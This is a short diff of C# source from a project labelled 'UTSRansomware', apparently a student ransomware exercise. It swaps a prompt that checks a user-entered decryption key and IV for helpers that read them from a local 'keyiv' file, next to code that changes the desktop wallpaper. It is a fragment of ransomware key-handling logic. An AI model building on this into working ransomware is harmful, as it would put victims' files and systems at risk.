@@ -74,26 +74,15 @@ namespace UTSRansomware
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, fullPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
         }
 
-
-        // Reads key and iv from user, checks to see if it matches the encryptor instance
-        public static bool ValidateKeyAndIv(byte[] key, byte[] iv)
+        public static bool KeyExists()
         {
-            // Prompt user for key and IV
-            Console.WriteLine("Please enter the key:");
-            string userInputKey = Console.ReadLine();
+            Console.WriteLine("Key exists");
+            return File.Exists("keyiv");
+        }
 
-            Console.WriteLine("Please enter the IV:");
-            string userInputIv = Console.ReadLine();
-
-            // Convert the base64 strings to byte arrays
-            byte[] inputKeyBytes = Convert.FromBase64String(userInputKey);
-            byte[] inputIvBytes = Convert.FromBase64String(userInputIv);
-
-            // Check if they match the current key and iv
-            bool keyMatches = key.SequenceEqual(inputKeyBytes);
-            bool ivMatches = iv.SequenceEqual(inputIvBytes);
-
-            return keyMatches && ivMatches;
+        public static string[] GetKeyAndIV()
+        {
+            return File.ReadAllLines("keyiv");
         }
     }
 }
